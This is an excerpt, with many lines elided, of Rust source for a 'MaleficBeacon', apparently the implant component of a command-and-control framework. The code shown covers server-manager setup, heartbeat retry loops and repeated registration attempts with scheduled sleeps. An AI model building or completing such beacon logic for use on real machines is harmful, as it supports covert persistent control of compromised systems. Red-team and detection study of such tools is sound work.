...
use malefic_core::transport::{Client, DialerExt, ServerManager, ServerManagerConfig};
...
impl MaleficBeacon {
    pub fn new(instance_id: [u8; 4], channel: MaleficChannel) -> Result<Self, Box<dyn std::error::Error>> {
        ...
        let server_config = ServerManagerConfig::default();
        let server_manager = ServerManager::new(config::SERVER_CONFIGS.values().cloned().collect(), Some(server_config));
        ...
        loop {
            ...
            match self.handle_heartbeat().await {
                ...
                Err(()) => {
                    ...
                    debug!("[beacon] Heartbeat failed : {}/{}", 
                           global_retry_count, self.server_manager.config.max_global_retry);

                    if self.server_manager.has_registered {
                        if global_retry_count >= self.server_manager.config.max_global_retry {
                            global_retry_count = 0;
                        }
                    } else {
    ...
    async fn init(&mut self) -> bool {
        let max_attempts = self.server_manager.config.max_initial_retry;
        ...
        for _ in 1..=max_attempts {
            ...
            let sleep_time = Duration::from_millis(self.stub.meta.new_heartbeat());
            debug!("[beacon] Next heartbeat in: {:?} (schedule: {})",
                   sleep_time, self.stub.meta.get_schedule_expression());
            Delay::new(sleep_time).await;
        }
        
        debug!("[beacon] Initial registration failed after {} attempts", max_attempts);
        false
    }
